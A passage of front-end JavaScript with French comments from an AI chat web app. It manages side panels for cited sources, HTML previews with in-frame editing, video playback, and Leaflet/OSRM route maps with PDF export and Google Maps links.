    if (copyBtn) copyBtn.disabled = false;
    setSourcesViewerSelection(activeIndex);
}

function openSourcesViewerForMessage(messageEl, preferredIndex = null) {
    if (!isSonarProConversation()) return false;

    const viewer = document.getElementById('sourcesViewer');
    if (!viewer) return false;

    const items = collectCitationItemsFromMessage(messageEl);
    if (items.length === 0) return false;

    closeHtmlViewer();
    closeVideoViewer();
    closeMapViewer();
    closeDeckViewer();
    viewer.classList.add('open');
    renderSourcesViewer(items, preferredIndex);
    setViewerLayoutState();
    return true;
}

function closeSourcesViewer() {
    document.getElementById('sourcesViewer')?.classList.remove('open');
    currentSourceItems = [];
    currentSourceSelectedUrl = '';
    currentSourceSelectedIndex = null;
    setViewerLayoutState();
}

// =========================================================
// VIEWER HTML
// =========================================================
function setViewerLayoutState() {
    const htmlOpen = document.getElementById('htmlViewer')?.classList.contains('open');
    const videoOpen = document.getElementById('videoViewer')?.classList.contains('open');
    const sourcesOpen = document.getElementById('sourcesViewer')?.classList.contains('open');
    const mapOpen = document.getElementById('mapViewer')?.classList.contains('open');
    const deckOpen = document.getElementById('deckViewer')?.classList.contains('open');
    document.querySelector('.app')?.classList.toggle('viewer-open', !!(htmlOpen || videoOpen || sourcesOpen || mapOpen || deckOpen));
}

/** Ferme le volet présentation (deck.js peut ne pas être chargé). */
function closeDeckViewer() {
    if (window.Deck?.close) window.Deck.close();
}

function openHtmlViewer(html, msgId, loading) {
    const viewer = document.getElementById('htmlViewer');
    if (!viewer) return;
    closeVideoViewer();
    closeSourcesViewer();
    closeMapViewer();
    closeDeckViewer();
    viewer.classList.add('open');
    setPreviewDevice('desktop'); // repart toujours en desktop à l'ouverture
    setViewerLayoutState();

    document.getElementById('htmlViewerLoading').style.display = loading ? '' : 'none';
    document.getElementById('htmlViewerCode').style.display    = 'none';
    document.getElementById('htmlViewerFrame').style.display   = 'none';
    setHtmlEditMode(false);
    if (loading) {
        const editBtn = document.getElementById('htmlViewerEdit');
        if (editBtn) editBtn.style.display = 'none';
    }

    if (!loading && html) {
        currentHtmlContent = html;
        currentHtmlMsgId   = msgId;
        switchToHtmlPreview(html);
    }
}

function closeHtmlViewer() {
    setHtmlEditMode(false);
    closeHtmlImagePicker();
    document.getElementById('htmlViewer')?.classList.remove('open');
    const frame = document.getElementById('htmlViewerFrame');
    if (frame) {
        frame.removeAttribute('srcdoc');
        frame.removeAttribute('src');
    }
    if (currentHtmlPreviewUrl) {
        URL.revokeObjectURL(currentHtmlPreviewUrl);
        currentHtmlPreviewUrl = null;
    }
    setViewerLayoutState();
}

function showHtmlViewerCode(html) {
    document.getElementById('htmlViewerLoading').style.display = 'none';
    const codeDiv = document.getElementById('htmlViewerCode');
    const pre     = document.getElementById('htmlViewerCodePre');
    if (codeDiv) codeDiv.style.display = '';
    if (pre)     pre.textContent = html || '';
    document.getElementById('htmlViewerFrame').style.display = 'none';
    setHtmlTab('code');
}

function switchToHtmlPreview(html) {
    document.getElementById('htmlViewerLoading').style.display = 'none';
    document.getElementById('htmlViewerCode').style.display    = 'none';
    const frame = document.getElementById('htmlViewerFrame');
    if (!frame) return;
    frame.style.display = '';
    // L'éditeur n'est injecté que pour une page persistée (msgId connu → sauvegarde possible).
    const editBtn = document.getElementById('htmlViewerEdit');
    if (editBtn) editBtn.style.display = currentHtmlMsgId ? '' : 'none';
    const previewDoc = buildHtmlPreviewDoc(html, !!currentHtmlMsgId);

    // Utilise un blob URL (même approche que l'onglet externe) pour éviter
    // les cas où srcdoc reste vide selon la structure HTML générée.
    if (currentHtmlPreviewUrl) {
        URL.revokeObjectURL(currentHtmlPreviewUrl);
        currentHtmlPreviewUrl = null;
    }
    const blob = new Blob([previewDoc], { type: 'text/html;charset=utf-8' });
    currentHtmlPreviewUrl = URL.createObjectURL(blob);
    frame.removeAttribute('srcdoc');
    frame.src = currentHtmlPreviewUrl;
    setHtmlTab('preview');
}

function setHtmlTab(tab) {
    document.getElementById('htmlTabCode')?.classList.toggle('active',    tab === 'code');
    document.getElementById('htmlTabPreview')?.classList.toggle('active', tab === 'preview');
}

// Recharge l'aperçu (rejoue le JS / les animations de la page).
function refreshHtmlPreview() {
    if (currentHtmlContent) switchToHtmlPreview(currentHtmlContent);
}

// =========================================================
// MODE ÉDITION DE L'APERÇU (côté parent)
// =========================================================
function setHtmlEditMode(on) {
    htmlEditMode = !!on;
    document.getElementById('htmlViewerEdit')?.classList.toggle('edit-active', htmlEditMode);
    if (!htmlEditMode) {
        closeHtmlImagePicker();
        setHtmlSaveState(null);
    }
    postToHtmlPreview({ type: 'mia-edit-mode', on: htmlEditMode });
}

function postToHtmlPreview(msg) {
    const frame = document.getElementById('htmlViewerFrame');
    try { frame?.contentWindow?.postMessage(msg, '*'); } catch (_) {}
}

// Indicateur de sauvegarde dans la barre du viewer : saving | saved | error | null.
function setHtmlSaveState(state) {
    const el = document.getElementById('htmlViewerSaveState');
    if (!el) return;
    clearTimeout(htmlSaveStateTimer);
    el.classList.remove('saving', 'saved', 'error');
    if (!state) { el.style.display = 'none'; el.textContent = ''; return; }
    el.style.display = '';
    el.classList.add(state);
    el.textContent = state === 'saving' ? 'Enregistrement…'
                   : state === 'saved'  ? t('Enregistré ✓')
                   : t('Échec de l\'enregistrement');
    if (state === 'saved') {
        htmlSaveStateTimer = setTimeout(() => setHtmlSaveState(null), 2500);
    }
}

// Sauvegarde le HTML renvoyé par l'éditeur de l'iframe (débounce déjà fait côté iframe).
// Les URL d'images générées, absolutisées pour l'affichage blob:, sont re-relativisées
// avant persistance (le HTML stocké reste portable, cf. absolutizeGeneratedAssets).
async function saveEditedHtml(html) {
    if (!currentHtmlMsgId) return;
    const rel = relativizeGeneratedAssets(html);
    currentHtmlContent = rel; // Code / Télécharger / Fenêtre servent la version éditée
    setHtmlSaveState('saving');
    try {
        const res = await fetch(`/chat/message/${currentHtmlMsgId}/html`, {
            method: 'POST',
            headers: { 'X-CSRF-Token': csrfToken, 'Content-Type': 'application/json' },
            body: JSON.stringify({ html: rel }),
        });
        const data = await res.json().catch(() => ({}));
        if (!res.ok || !data.ok) throw new Error(data.error || 'save');
        setHtmlSaveState('saved');
    } catch (_) {
        setHtmlSaveState('error');
    }
}

// Petit panneau fichier/URL affiché quand l'éditeur demande une image.
function openHtmlImagePicker(mode) {
    htmlImagePickerMode = mode === 'replace' ? 'replace' : 'insert';
    const picker = document.getElementById('htmlImagePicker');
    if (!picker) return;
    const urlInput = document.getElementById('htmlImagePickerUrl');
    if (urlInput) urlInput.value = '';
    const title = document.getElementById('htmlImagePickerTitle');
    if (title) title.textContent = htmlImagePickerMode === 'replace' ? 'Remplacer l\'image' : t('Insérer une image');
    picker.style.display = '';
}

function closeHtmlImagePicker() {
    const picker = document.getElementById('htmlImagePicker');
    if (picker) picker.style.display = 'none';
}

// Transmet l'URL choisie à l'éditeur de l'iframe. Les chemins relatifs de l'app sont
// absolutisés (contexte blob: — même besoin que absolutizeGeneratedAssets).
function sendImageToHtmlPreview(url) {
    const abs = /^https?:\/\//i.test(url) ? url : location.origin + url;
    postToHtmlPreview({ type: 'mia-insert-image', url: abs, mode: htmlImagePickerMode });
    closeHtmlImagePicker();
}

async function uploadHtmlPickedImage(file) {
    if (!file || !currentHtmlMsgId) return;
    const fd = new FormData();
    fd.append('image', file);
    setHtmlSaveState('saving');
    try {
        const res = await fetch(`/chat/message/${currentHtmlMsgId}/html-image`, {
            method: 'POST',
            headers: { 'X-CSRF-Token': csrfToken },
            body: fd,
        });
        const data = await res.json().catch(() => ({}));
        if (!res.ok || !data.ok || !data.url) throw new Error(data.error || 'upload');
        setHtmlSaveState(null);
        sendImageToHtmlPreview(data.url);
    } catch (err) {
        setHtmlSaveState(null);
        showToast(err && err.message && err.message !== 'upload' ? err.message : t('Échec de l\'envoi de l\'image.'), 'error');
    }
}

// Bascule l'aperçu entre rendu pleine largeur (desktop) et gabarit téléphone (390px centré).
function setPreviewDevice(mode) {
    const viewer = document.getElementById('htmlViewer');
    if (!viewer) return;
    const mobile = mode === 'mobile';
    viewer.classList.toggle('preview-mobile', mobile);
    document.getElementById('htmlDeviceDesktop')?.classList.toggle('active', !mobile);
    document.getElementById('htmlDeviceMobile')?.classList.toggle('active', mobile);
}

// Largeur du panneau pilotée par --viewer-width (le panneau ET le décalage du chat la lisent).
// `px` et les bornes sont en pixels de PAGE : la taille d'affichage zoome <html>,
// la largeur de la fenêtre est donc ramenée à l'échelle de la page.
function applyViewerWidth(px) {
    const z = window.miaUiZoom ? window.miaUiZoom() : 1;
    const vw = window.innerWidth / z;
    const min = 360;
    const max = Math.max(min, Math.min(vw - 280, Math.round(vw * 0.85)));
    const w = Math.max(min, Math.min(Math.round(px), max));
    document.documentElement.style.setProperty('--viewer-width', w + 'px');
    return w;
}

// Poignées de redimensionnement au bord gauche des panneaux (drag). Désactivées < 768px (plein écran).
// La largeur (--viewer-width) est commune à tous les volets droits (HTML, carte…).
function initHtmlViewerResize() {
    const saved = parseInt(localStorage.getItem('htmlViewerWidth') || '', 10);
    if (saved) applyViewerWidth(saved);
    bindViewerResizeHandle(document.getElementById('htmlViewerResizer'));
    bindViewerResizeHandle(document.getElementById('mapViewerResizer'));
    bindViewerResizeHandle(document.getElementById('deckViewerResizer'));
}

function bindViewerResizeHandle(handle) {
    if (!handle) return;

    let resizing = false;
    handle.addEventListener('pointerdown', (e) => {
        if (window.innerWidth <= 768) return; // mobile = panneau plein écran, pas de resize
        resizing = true;
        handle.classList.add('dragging');
        document.body.style.userSelect = 'none';
        try { handle.setPointerCapture(e.pointerId); } catch (_) {}
        e.preventDefault();
    });
    handle.addEventListener('pointermove', (e) => {
        if (!resizing) return;
        // Position du pointeur en pixels d'écran → largeur en pixels de page.
        applyViewerWidth((window.innerWidth - e.clientX) / (window.miaUiZoom ? window.miaUiZoom() : 1));
    });
    const end = (e) => {
        if (!resizing) return;
        resizing = false;
        handle.classList.remove('dragging');
        document.body.style.userSelect = '';
        try { handle.releasePointerCapture(e.pointerId); } catch (_) {}
        const w = parseInt(getComputedStyle(document.documentElement).getPropertyValue('--viewer-width'), 10);
        if (w) localStorage.setItem('htmlViewerWidth', String(w));
        if (leafletMap) leafletMap.invalidateSize(); // la carte suit la nouvelle largeur
    };
    handle.addEventListener('pointerup', end);
    handle.addEventListener('pointercancel', end);
    handle.addEventListener('dblclick', () => { // double-clic = reset largeur par défaut
        document.documentElement.style.removeProperty('--viewer-width');
        localStorage.removeItem('htmlViewerWidth');
    });
}

function downloadHtml(html, filename) {
    const blob = new Blob([html], { type: 'text/html' });
    if (window.NativeBridge?.saveAndShare) {
        window.NativeBridge.saveAndShare(blob, filename || 'page.html');
        return;
    }
    const a    = document.createElement('a');
    const url  = URL.createObjectURL(blob);
    a.href     = url;
    a.download = filename || 'page.html';
    a.style.display = 'none';
    document.body.appendChild(a);
    a.click();
    a.remove();
    setTimeout(() => URL.revokeObjectURL(url), 8000);
}

function openHtmlInExternalWindow(html) {
    if (!html) return;
    // Réécriture des images générées (cf. absolutizeGeneratedAssets) : sans elle, dans un
    // document chargé via blob: les chemins /assets/img/generated/… se résolvent contre
    // l'URL blob: → images cassées (bug « agrandir » / ouvrir dans un nouvel onglet).
    const doc  = absolutizeGeneratedAssets(cleanHtmlCode(String(html)));
    const blob = new Blob([doc], { type: 'text/html' });
    // App mobile : window.open(blob:) n'est pas fiable en WebView → partage
    // natif du fichier HTML (le viewer interne reste le chemin principal).
    if (window.NativeBridge?.saveAndShare) {
        window.NativeBridge.saveAndShare(blob, 'page.html');
        return;
    }
    const url  = URL.createObjectURL(blob);
    const win  = window.open(url, '_blank', 'noopener,noreferrer');
    if (win) win.opener = null;
    setTimeout(() => URL.revokeObjectURL(url), 8000);
}

function openVideoViewer(videoUrl, msgId, loading, metaText, filename) {
    const viewer = document.getElementById('videoViewer');
    if (!viewer) return;
    if (!loading && !videoUrl) return;
    closeHtmlViewer();
    closeSourcesViewer();
    closeMapViewer();
    closeDeckViewer();
    viewer.classList.add('open');
    setViewerLayoutState();

    const loadingEl = document.getElementById('videoViewerLoading');
    const contentEl = document.getElementById('videoViewerContent');
    const player    = document.getElementById('videoViewerPlayer');
    const metaEl    = document.getElementById('videoViewerMeta');

    if (loadingEl) loadingEl.style.display = loading ? '' : 'none';
    if (contentEl) contentEl.style.display = loading ? 'none' : '';

    if (loading) {
        currentVideoUrl = '';
        currentVideoMsgId = null;
        currentVideoMeta = null;
        currentVideoFilename = 'video.mp4';
        if (player) {
            player.pause();
            player.removeAttribute('src');
            player.load();
        }
    } else if (player && videoUrl) {
        currentVideoUrl   = videoUrl;
        currentVideoMsgId = msgId || null;
        currentVideoMeta  = metaText || null;
        currentVideoFilename = filename || 'video.mp4';
        player.src = videoUrl;
        player.load();
    }
    if (metaEl) metaEl.textContent = metaText || '';
}

function closeVideoViewer() {
    document.getElementById('videoViewer')?.classList.remove('open');
    const player = document.getElementById('videoViewerPlayer');
    if (player) {
        player.pause();
        player.removeAttribute('src');
        player.load();
    }
    currentVideoFilename = 'video.mp4';
    setViewerLayoutState();
}

function downloadVideoFromUrl(videoUrl, filename) {
    if (!videoUrl) return;
    // App mobile : téléchargement même-origine puis feuille de partage native.
    if (window.NativeBridge?.saveAndShare) {
        fetch(videoUrl)
            .then(r => { if (!r.ok) throw new Error('HTTP ' + r.status); return r.blob(); })
            .then(blob => window.NativeBridge.saveAndShare(blob, filename || 'video.mp4'))
            .catch(() => alert(t('Téléchargement de la vidéo impossible.')));
        return;
    }
    const a = document.createElement('a');
    a.href = videoUrl;
    a.download = filename || 'video.mp4';
    a.click();
}

let viewersControlsBound = false;
let richCardsDelegationBound = false;

// =========================================================
// VIEWER CARTE / ITINÉRAIRE (Leaflet + OpenStreetMap)
// =========================================================
// La spec d'itinéraire (JSON produit par le LLM, géocodé côté serveur) est
// rendue sur une carte Leaflet dans le volet droit : marqueurs numérotés,
// tracé OSRM par la route (fallback lignes droites), notes du trajet,
// export PDF (carte + notes, via l'export PDF serveur) et ouverture dans Google Maps.
let currentMapSpec      = null;
let currentMapMsgId     = null;
let currentMapMeta      = null;   // distance/durée OSRM du dernier rendu (pour l'export PDF)
let currentMapWarnings  = [];     // avertissements du dernier rendu (pour l'export PDF)
let leafletMap      = null;   // instance L.map (détruite à la fermeture du volet)
let mapScreenshoter = null;
let mapRenderSeq    = 0;      // anti-course : seul le rendu le plus récent aboutit

const MAP_PROFILE_LABELS = { driving: t('En voiture'), cycling: t('À vélo'), walking: t('À pied') };

function mapProfileToOsrm(profile) {
    return { driving: 'driving', cycling: 'cycling', walking: 'walking' }[profile] || 'driving';
}

// Instances OSRM publiques FOSSGIS (celles d'openstreetmap.org) : une instance
// PAR PROFIL. Indispensable : le serveur démo router.project-osrm.org ne sert
// que le profil voiture (le segment /walking/ y est ignoré) → un trajet à pied
// y suivait les routes avec des durées automobile. routed-foot suit les
// sentiers et chemins piétons, routed-bike les axes cyclables.
// NB : share.js réplique cette résolution — à synchroniser.
function mapOsrmBase(profile) {
    return {
        driving: 'https://routing.openstreetmap.de/routed-car',
        cycling: 'https://routing.openstreetmap.de/routed-bike',
        walking: 'https://routing.openstreetmap.de/routed-foot',
    }[profile] || 'https://routing.openstreetmap.de/routed-car';
}

function mapProfileToGmaps(profile) {
    return { driving: 'driving', cycling: 'bicycling', walking: 'walking' }[profile] || 'driving';
}

function mapAccentColor() {
    const c = getComputedStyle(document.documentElement).getPropertyValue('--accent').trim();
    return c || '#2563eb';
}

function setMapLoadingText(text) {
    const el = document.getElementById('mapViewerLoadingText');
    if (el) el.textContent = text;
}

function openMapViewer(spec, msgId, loading) {
    const viewer = document.getElementById('mapViewer');
    if (!viewer) return;
    closeHtmlViewer();
    closeVideoViewer();
    closeSourcesViewer();
    closeDeckViewer();
    viewer.classList.add('open');
    setViewerLayoutState();

    document.getElementById('mapViewerLoading').style.display = loading ? '' : 'none';
    document.getElementById('mapViewerBody').style.display    = loading ? 'none' : '';
    if (loading) {
        setMapLoadingText(t('Calcul de l\'itinéraire…'));
        document.getElementById('mapViewerTitle').textContent = t('Itinéraire');
    }

    if (!loading && spec) renderMapSpec(spec, msgId);
}

function closeMapViewer() {
    document.getElementById('mapViewer')?.classList.remove('open');
    // Carte détruite à la fermeture : évite les instances fantômes et les
    // soucis de dimensions Leaflet quand le volet est masqué.
    if (leafletMap) {
        try { leafletMap.remove(); } catch (_) {}
        leafletMap = null;
        mapScreenshoter = null;
    }
    setViewerLayoutState();
}

// NB : la page de partage (share.js) réplique ce rendu en version épurée — à synchroniser.
async function renderMapSpec(spec, msgId) {
    if (!spec || !Array.isArray(spec.waypoints)) return;
    if (typeof L === 'undefined') {
        console.error('[Map] Leaflet indisponible');
        return;
    }
    currentMapSpec  = spec;
    currentMapMsgId = msgId || null;
    const seq = ++mapRenderSeq;

    document.getElementById('mapViewerLoading').style.display = 'none';
    document.getElementById('mapViewerBody').style.display    = '';
    document.getElementById('mapViewerTitle').textContent = spec.title || t('Itinéraire');

    // (Re)création de la carte — preferCanvas + tuiles CORS = export PNG possible
    if (leafletMap) {
        try { leafletMap.remove(); } catch (_) {}
        leafletMap = null;
        mapScreenshoter = null;
    }
    leafletMap = L.map('mapCanvas', { preferCanvas: true });
    L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19,
        crossOrigin: 'anonymous',
        attribution: '&copy; <a href="https://www.openstreetmap.org/copyright" target="_blank" rel="noopener">OpenStreetMap</a>',
    }).addTo(leafletMap);
    if (typeof L.simpleMapScreenshoter === 'function') {
        mapScreenshoter = L.simpleMapScreenshoter({ hidden: true, preventDownload: true }).addTo(leafletMap);
    }

    const waypoints = spec.waypoints;
    const located = waypoints.filter(w => typeof w.lat === 'number' && typeof w.lon === 'number');
    const lost    = waypoints.filter(w => typeof w.lat !== 'number' || typeof w.lon !== 'number');
    const warnings = [];
    if (lost.length) {
        warnings.push(t('Étape(s) non localisée(s) : ') + lost.map(w => w.name || w.query || '?').join(', ') + '.');
    }

    // Marqueurs numérotés (numéro = position dans le trajet complet)
    located.forEach(w => {
        const idx  = waypoints.indexOf(w) + 1;
        const icon = L.divIcon({
            className: 'map-marker-wrap',
            html: `<div class="map-marker">${idx}</div>`,
            iconSize: [30, 30], iconAnchor: [15, 30], popupAnchor: [0, -30],
        });
        const note = w.note ? `<div class="map-popup-note">${escHtml(w.note)}</div>` : '';
        L.marker([w.lat, w.lon], { icon, title: w.name || '' })
            .addTo(leafletMap)
            .bindPopup(`<strong>${idx}. ${escHtml(w.name || '')}</strong>${note}`);
    });

    if (located.length === 0) {
        leafletMap.setView([46.6, 2.4], 5); // vue France par défaut
        warnings.push(t('Aucune étape localisable — vérifiez les lieux demandés.'));
        renderMapNotes(spec, null, warnings);
        return;
    }

    leafletMap.fitBounds(L.latLngBounds(located.map(w => [w.lat, w.lon])), { padding: [40, 40], maxZoom: 14 });
    // Le volet vient de s'ouvrir : Leaflet doit recalculer ses dimensions
    setTimeout(() => { if (leafletMap && seq === mapRenderSeq) leafletMap.invalidateSize(); }, 80);

    renderMapNotes(spec, null, warnings); // stats affichées quand OSRM répond

    // Tracé réel par la route (OSRM public), fallback lignes droites pointillées
    let meta = null;
    let routeLatLngs = null;
    if (located.length >= 2) {
        try {
            const coords = located.map(w => `${w.lon},${w.lat}`).join(';');
            const ctrl = new AbortController();
            const timer = setTimeout(() => ctrl.abort(), 12000);
            const res = await fetch(
                `${mapOsrmBase(spec.profile)}/route/v1/${mapProfileToOsrm(spec.profile)}/${coords}?overview=full&geometries=geojson&steps=false`,
                { signal: ctrl.signal }
            );
            clearTimeout(timer);
            const data = await res.json();
            if (data && data.code === 'Ok' && data.routes && data.routes[0]) {
                routeLatLngs = data.routes[0].geometry.coordinates.map(c => [c[1], c[0]]);
                meta = { distance: data.routes[0].distance, duration: data.routes[0].duration, approx: false };
            }
        } catch (_) { /* OSRM injoignable → fallback ci-dessous */ }
    }
    if (seq !== mapRenderSeq || !leafletMap) return; // un rendu plus récent a pris la main

    if (routeLatLngs) {
        L.polyline(routeLatLngs, { color: mapAccentColor(), weight: 5, opacity: 0.85 }).addTo(leafletMap);
        leafletMap.fitBounds(L.latLngBounds(routeLatLngs), { padding: [40, 40] });
    } else if (located.length >= 2) {
        L.polyline(located.map(w => [w.lat, w.lon]), {
            color: mapAccentColor(), weight: 4, opacity: 0.7, dashArray: '8 8',
        }).addTo(leafletMap);
        warnings.push(t('Tracé approximatif : le calcul d\'itinéraire par la route est momentanément indisponible.'));
        meta = { approx: true };
    }
    renderMapNotes(spec, meta, warnings);
}

function formatMapDistance(meters) {
    if (!(meters > 0)) return '';
    return meters < 1000 ? `${Math.round(meters)} m` : `${(meters / 1000).toFixed(meters >= 100000 ? 0 : 1)} km`;
}

function formatMapDuration(seconds) {
    if (!(seconds > 0)) return '';
    const h = Math.floor(seconds / 3600);
    const m = Math.round((seconds % 3600) / 60);
    return h > 0
        ? t('{h} h {m}', { h: h, m: String(m).padStart(2, '0') })
        : t('{m} min', { m: m });
}

function buildMapStatParts(spec, meta) {
    const statParts = [MAP_PROFILE_LABELS[spec.profile] || MAP_PROFILE_LABELS.driving];
    if (meta && !meta.approx) {
        const d = formatMapDistance(meta.distance);
        if (d) statParts.push(d);
        // À pied, la durée OSRM ignore le dénivelé : l'estimation du modèle
        // (duration_hint, qui en tient compte) prime ; sinon la durée à plat
        // est affichée avec sa réserve. Autres profils : durée OSRM.
        const duree = formatMapDuration(meta.duration);
        if (spec.profile === 'walking' && spec.duration_hint) {
            statParts.push(spec.duration_hint);
        } else if (spec.profile === 'walking' && duree) {
            statParts.push(window.t('≈ {duree} (hors dénivelé)', { duree: duree }));
        } else if (duree) {
            statParts.push(`≈ ${duree}`);
        }
    } else if (spec.duration_hint) {
        statParts.push(spec.duration_hint);
    }
    return statParts;
}

function renderMapNotes(spec, meta, warnings) {
    // Mémorisés pour l'export PDF (mêmes données que le panneau de notes)
    currentMapMeta     = meta || null;
    currentMapWarnings = (warnings || []).filter(Boolean);

    const titleEl    = document.getElementById('mapNotesTitle');
    const statsEl    = document.getElementById('mapNotesStats');
    const summaryEl  = document.getElementById('mapNotesSummary');
    const stepsEl    = document.getElementById('mapNotesSteps');
    const generalEl  = document.getElementById('mapNotesGeneral');
    const warnEl     = document.getElementById('mapNotesWarnings');
    if (!titleEl) return;

    titleEl.textContent = spec.title || t('Itinéraire');
    statsEl.textContent = buildMapStatParts(spec, meta).join(' · ');

    summaryEl.textContent = spec.summary || '';
    summaryEl.style.display = spec.summary ? '' : 'none';

    stepsEl.innerHTML = (spec.waypoints || []).map(w => {
        const lostBadge = (typeof w.lat !== 'number' || typeof w.lon !== 'number')
            ? ' <span class="map-step-lost" title="Lieu non localisé sur la carte">non localisée</span>' : '';
        const note = w.note ? `<span class="map-step-note">${escHtml(w.note)}</span>` : '';
        return `<li><strong>${escHtml(w.name || w.query || '?')}</strong>${lostBadge}${note}</li>`;
    }).join('');

    const notes = Array.isArray(spec.notes) ? spec.notes.filter(Boolean) : [];
    generalEl.innerHTML = notes.map(n => `<li>${escHtml(n)}</li>`).join('');
    generalEl.style.display = notes.length ? '' : 'none';

    const warns = (warnings || []).filter(Boolean);
    warnEl.innerHTML = warns.map(w => `<div>⚠ ${escHtml(w)}</div>`).join('');
    warnEl.style.display = warns.length ? '' : 'none';
}

function mapExportFilename(ext) {
    const titre = (currentMapSpec && currentMapSpec.title) || 'itineraire';
    const slug = titre.toLowerCase().normalize('NFD').replace(/[̀-ͯ]/g, '')
        .replace(/[^a-z0-9]+/g, '-').replace(/(^-|-$)/g, '') || 'itineraire';
    return slug + '.' + (ext || 'pdf');
}

// Capture PNG du screenshoter → data-URI JPEG compressé (fond blanc, largeur
// bornée) : reste largement sous la limite serveur de l'export PDF.
async function mapScreenshotToJpegDataUri(blob) {
    const url = URL.createObjectURL(blob);
    try {
        const img = await new Promise((resolve, reject) => {
            const i = new Image();
            i.onload  = () => resolve(i);
            i.onerror = () => reject(new Error('screenshot illisible'));
            i.src = url;
        });
        const MAX_W  = 1600;
        const scale  = Math.min(1, MAX_W / (img.naturalWidth || MAX_W));
        const canvas = document.createElement('canvas');
        canvas.width  = Math.max(1, Math.round(img.naturalWidth * scale));
        canvas.height = Math.max(1, Math.round(img.naturalHeight * scale));
        const ctx = canvas.getContext('2d');
        ctx.fillStyle = '#ffffff';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
        return canvas.toDataURL('image/jpeg', 0.85);
    } finally {
        URL.revokeObjectURL(url);
    }
}

// Document imprimable : carte + notes du trajet (mêmes données que le panneau
// de notes). Styles inline simples, compatibles Dompdf.
function buildMapPdfHtml(imgDataUri) {
    const spec  = currentMapSpec || {};
    const stats = buildMapStatParts(spec, currentMapMeta).join(' · ');
    const steps = (spec.waypoints || []).map(w => {
        const lost = (typeof w.lat !== 'number' || typeof w.lon !== 'number')
            ? ' <em style="color:#a15c00">(non localisée sur la carte)</em>' : '';
        const note = w.note ? ` — ${escHtml(w.note)}` : '';
        return `<li style="margin:3px 0"><strong>${escHtml(w.name || w.query || '?')}</strong>${lost}${note}</li>`;
    }).join('');
    const notes = (Array.isArray(spec.notes) ? spec.notes.filter(Boolean) : [])
        .map(n => `<li style="margin:3px 0">${escHtml(n)}</li>`).join('');
    const warns = currentMapWarnings
        .map(w => `<div style="color:#a15c00;margin:3px 0">⚠ ${escHtml(w)}</div>`).join('');

    return `<div style="color:#111">
<h1 style="font-size:17pt;margin:0 0 4px">${escHtml(spec.title || t('Itinéraire'))}</h1>
<div style="color:#555;font-size:10pt;margin:0 0 10px">${escHtml(stats)}</div>
<img src="${imgDataUri}" style="width:100%;border:1px solid #ddd" alt="Carte de l'itinéraire">
${spec.summary ? `<p style="margin:10px 0 0">${escHtml(spec.summary)}</p>` : ''}
${steps ? `<h2 style="font-size:13pt;margin:14px 0 4px">Étapes</h2><ol style="margin:0;padding-left:22px">${steps}</ol>` : ''}
${notes ? `<h2 style="font-size:13pt;margin:14px 0 4px">Notes</h2><ul style="margin:0;padding-left:22px">${notes}</ul>` : ''}
${warns ? `<div style="margin-top:12px">${warns}</div>` : ''}
</div>`;
}

// Téléchargement PNG brut : filet quand le message n'est pas (encore) persisté.
function downloadMapScreenshot(blob) {
    const a   = document.createElement('a');
    const url = URL.createObjectURL(blob);
    a.href = url;
    a.download = mapExportFilename('png');
    a.style.display = 'none';
    document.body.appendChild(a);
    a.click();
    a.remove();
    setTimeout(() => URL.revokeObjectURL(url), 8000);
}

async function exportMapPdf() {
    if (!leafletMap || !mapScreenshoter) return;
    const btn = document.getElementById('mapViewerPdf');
    if (btn) btn.disabled = true;
    try {
        leafletMap.closePopup();
        const blob = await mapScreenshoter.takeScreen('blob');

        if (!currentMapMsgId) {
            // Pas d'id de message → l'export PDF serveur est impossible : PNG de secours
            downloadMapScreenshot(blob);
            return;
        }

        const imgDataUri = await mapScreenshotToJpegDataUri(blob);
        const res = await fetchWithSessionGuard(`/chat/message/${encodeURIComponent(currentMapMsgId)}/pdf`, {
            method: 'POST',
            headers: {
                'X-CSRF-Token': csrfToken,
                'Content-Type': 'application/json',
                'Accept': 'application/pdf',
            },
            body: JSON.stringify({ html: buildMapPdfHtml(imgDataUri) }),
        });
        if (!res.ok) {
            const data = await res.json().catch(() => ({}));
            throw new Error(data.error || `HTTP ${res.status}`);
        }
        downloadBlobAsFile(await res.blob(), mapExportFilename('pdf'));
    } catch (e) {
        if (e instanceof Error && e.message === 'SESSION_EXPIRED') return;
        console.error('[Map] Export PDF impossible', e);
        alert(t('Export PDF impossible (tuiles de carte non chargées ?). Réessayez une fois la carte affichée.'));
    } finally {
        if (btn) btn.disabled = false;
    }
}

function openMapInGoogleMaps() {
    const spec = currentMapSpec;
    if (!spec) return;
    const pts = (spec.waypoints || []).filter(w => typeof w.lat === 'number' && typeof w.lon === 'number');
    if (pts.length < 2) return;
    const fmt = w => `${w.lat},${w.lon}`;
    // Google Maps accepte au plus 9 étapes intermédiaires dans une URL de direction
    let vias = pts.slice(1, -1);
    if (vias.length > 9) vias = vias.slice(0, 9);
    const params = new URLSearchParams({
        api: '1',
        origin: fmt(pts[0]),
        destination: fmt(pts[pts.length - 1]),
        travelmode: mapProfileToGmaps(spec.profile),
    });
    if (vias.length) params.set('waypoints', vias.map(fmt).join('|'));
    const win = window.open('https://www.google.com/maps/dir/?' + params.toString(), '_blank', 'noopener,noreferrer');
    if (win) win.opener = null;
}

async function generateMap(prompt, toolId) {
    if (!convId()) {
        if (!await createConversation()) return;
    }

    appendMessage('user', prompt);
    msgInput.value = '';
    msgInput.style.height = 'auto';
    sendBtn.disabled = true;
    clearFiles();

    // Ouvre le volet carte en mode chargement
    openMapViewer(null, null, true);

    // Placeholder dans le chat
    const assistantEl = appendMessage('assistant', '', [], true);
    const mdEl = assistantEl.querySelector('.md-render');
    if (mdEl) {
        mdEl.innerHTML = '<span style="color:var(--text-muted);font-style:italic;font-size:13px">🗺 Construction de l\'itinéraire en cours…</span>';
    }

    const fd = new FormData();
    fd.append('message', prompt);
    fd.append('tool_id', toolId);

    try {
        const response = await fetch(`/chat/${convId()}/generate-map`, {
            method: 'POST',
            headers: { 'X-CSRF-Token': csrfToken },
            body: fd,
        });

        if (!response.ok) {
            const errData = await response.json().catch(() => ({}));
            if (response.status === 429 && handleQuotaExceededPayload(errData)) {
                assistantEl.closest('.message')?.remove();
                closeMapViewer();
                return;
            }
            throw new Error(errData.error || t('Erreur serveur ({code})', { code: response.status }));
        }

        const reader  = response.body.getReader();
        const decoder = new TextDecoder();
        let buffer    = '';
        let rawSpec   = '';
        let gotError  = false;

        while (true) {
            const { done, value } = await reader.read();
            if (done) break;

